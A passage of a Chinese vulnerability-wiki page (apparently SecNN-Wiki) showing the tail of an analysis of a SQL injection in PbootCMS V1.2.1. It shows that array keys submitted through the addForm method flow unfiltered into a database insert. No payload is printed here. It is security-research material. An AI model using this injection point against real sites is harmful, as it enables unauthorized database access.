+<div class="codehilite"><pre><span></span><code><span class="err">然后就会带入</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">model</span><span class="o">-&gt;</span><span class="n">addForm</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="err">执行语句</span>
+</code></pre></div>
+
+<p>文件：PbootCMS-V1.2.1\apps\api\model\CmsModel.php 方法：addForm(</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// 新增表单数据</span>
+<span class="n">public</span><span class="w"> </span><span class="k">function</span><span class="w"> </span><span class="n">addForm</span><span class="p">(</span><span class="no">$</span><span class="n">table</span><span class="p">,</span><span class="w"> </span><span class="no">$</span><span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">parent</span><span class="p">::</span><span class="n">table</span><span class="p">(</span><span class="no">$</span><span class="n">table</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">insert</span><span class="p">(</span><span class="no">$</span><span class="n">data</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>根据6.0可以看到带入了进入了 insert 那么我们传的二维数组刚好可以控制key
+带入数据库查询引发注入</p>
+<h2 id="_1">四、参考链接<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv">https://www.yuque.com/pmiaowu/bfgkkh/lrqvqv</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../PbootCMS%20v2.0.7%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        PbootCMS v2.0.7 任意文件读取
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../PbootCMS%20search%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../PbootCMS%20search%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        PbootCMS search SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
